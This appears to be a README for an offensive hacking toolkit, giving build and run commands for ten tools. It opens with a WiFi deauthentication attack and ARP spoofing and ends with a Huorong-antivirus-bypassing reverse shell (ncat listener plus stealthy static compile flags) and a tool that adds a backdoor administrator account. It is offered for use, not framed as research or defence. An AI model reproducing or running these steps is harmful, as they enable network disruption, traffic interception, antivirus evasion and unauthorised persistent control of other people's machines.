1 Deauth Attack
usage
bash 0.sh
Please add sleep yourself in 0.sh.
And modify channel b in the main function in 0.c,addr2 and addr3 in 3.py
This project is equivalent to executing,
aireplay-ng -0 <int type> -a 1C:FF:59:33:7F:FF(AP) --ignore-negative-one -D wlan0
If you want to comment, please cat 0.txt
2 2.py
usage 
python3 2.py <IP Address>
Please go to maxmind to download GeoLite2-City.mmdb and run it.
3 Metadata Of Movie or Picture
usage python3 1.py
step
start ms-settings:privacy-location
turn on location services let app camera access your location
then start microsoft.windows.camera:
...
4 Gateway Mac Address
usage
pwsh
.\0.ps1
python3 0.py
Please change src in 0.py to the output of 0.ps1
5 Bluetooth Pair
usage
python3 4.py
6 Arp Spoof
usage 
python3 9.py
python3 10.py
Modify the wlp3s0 (network card) in 10.py
local ethernet address && gateway ipv4 address
7 Login Optical Modem
usage
gcc ./2.c -o 2
./2
Modify the psd and Content-Length in 2.c
Only available with TEWA-708G Fiber Optic Modem
8 Bypass Huorong Reverse Shell(Small Version)
usage
ncat -lvp 19482
g++ 0.cpp -o 00 -lws2_32 -s -O2 -static -static-libgcc -static-libstdc++ -mwindows
Need to modify the RyzU1 in 0.cpp
9 bypass huorong add user account 
usage
x86_64-w64-mingw32-g++ -o 001 1.cpp -lnetapi32 -static -static-libgcc -static-libstdc++
001.exe
net localgroup administrators DSzOO3vnAu /add
10 Enum All Process ID
x86_64-w64-mingw32-g++ -o 002 2.cpp -lpsapi
002.exe